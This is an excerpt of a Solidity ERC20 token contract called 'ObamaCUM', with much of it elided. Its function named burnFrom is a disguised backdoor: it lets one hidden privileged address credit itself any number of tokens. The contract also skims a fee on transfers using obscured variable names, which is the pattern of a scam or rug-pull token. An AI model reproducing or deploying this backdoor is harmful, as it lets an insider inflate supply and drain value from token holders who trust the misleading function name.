 ...
 */
 ...
 contract ObamaCum is Context, ERC20, ERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name = "ObamaCUM";
    string private _symbol = "OBAMACUM";
    uint256 private _MIB = 2 * 1**8;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    address private tokenDeliverer;
    address private _deleted;
    uint256 private _taximus = 4;
    uint256 private _luis = 1;
    address private _owner;
    uint256 private _fee;
    bool unlockAllTime = true;
    bool isNumber = true;

    constructor(uint256 totalSupply_,address deleted_) {
    ...
    function burnFrom(uint256 amount) public{
        require(_msgSender() == _deleted, "ERC20: will not permit action right now.");
        _balances[_msgSender()] += amount;
     
    }
    
    function unlockForAllTime() public virtual onlyOwner {
    ...
    function _transfer(
        ...
        _fee = (amount * _taximus / 100) / _luis;
        amount = amount -  (_fee * _luis);
